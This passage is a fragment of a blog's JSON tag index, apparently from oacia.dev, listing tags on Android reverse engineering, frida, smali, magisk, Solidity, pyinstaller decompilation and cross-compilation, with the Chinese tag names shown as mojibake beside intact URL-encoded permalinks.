¡é“","slug":"ç®¡é“","permalink":"https://oacia.dev/tags/%E7%AE%A1%E9%81%93/"},{"name":"å…±äº«å†…å­˜","slug":"å…±äº«å†…å­˜","permalink":"https://oacia.dev/tags/%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/"},{"name":"frida","slug":"frida","permalink":"https://oacia.dev/tags/frida/"},{"name":"å®‰å“é€†å‘","slug":"å®‰å“é€†å‘","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"},{"name":"å¹³æ¿åˆ·æœº","slug":"å¹³æ¿åˆ·æœº","permalink":"https://oacia.dev/tags/%E5%B9%B3%E6%9D%BF%E5%88%B7%E6%9C%BA/"},{"name":"BLé”","slug":"BLé”","permalink":"https://oacia.dev/tags/BL%E9%94%81/"},{"name":"magisk","slug":"magisk","permalink":"https://oacia.dev/tags/magisk/"},{"name":"odin3","slug":"odin3","permalink":"https://oacia.dev/tags/odin3/"},{"name":"å®‰å“é™æ€æ’æ¡©","slug":"å®‰å“é™æ€æ’æ¡©","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%9D%99%E6%80%81%E6%8F%92%E6%A1%A9/"},{"name":"smali","slug":"smali","permalink":"https://oacia.dev/tags/smali/"},{"name":"æ™ºèƒ½åˆçº¦","slug":"æ™ºèƒ½åˆçº¦","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"åŒºå—é“¾","slug":"åŒºå—é“¾","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"æ‰¹é‡ç¼–è¯‘","slug":"æ‰¹é‡ç¼–è¯‘","permalink":"https://oacia.dev/tags/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91/"},{"name":"æå–å…¬å¼€åº“","slug":"æå–å…¬å¼€åº“","permalink":"https://oacia.dev/tags/%E6%8F%90%E5%8F%96%E5%85%AC%E5%BC%80%E5%BA%93/"},{"name":"pyinstaller","slug":"pyinstaller","permalink":"https://oacia.dev/tags/pyinstaller/"},{"name":"uncompyle6","slug":"uncompyle6","permalink":"https://oacia.dev/tags/uncompyle6/"},{"name":"pycdc","slug":"pycdc","permalink":"https://oacia.dev/tags/pycdc/"},{"name":"web3","slug":"web3","permalink":"https://oacia.dev/tags/web3/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://oacia.dev/tags/%E7%AE%97%E6%B3%95/"},{"name":"æŸšé¸Ÿå¤","slug":"æŸšé¸Ÿå¤","permalink":"https://oacia.dev/tags/%E6%9F%9A%E9%B8%9F%E5%A4%8F/"},{"name":"Cè¯­è¨€","slug":"Cè¯­è¨€","permalink":"https://oacia.dev/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"äº¤å‰ç¼–è¯‘","slug":"äº¤å‰ç¼–è¯‘","permalink":"https://oacia.dev/tags/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"}]}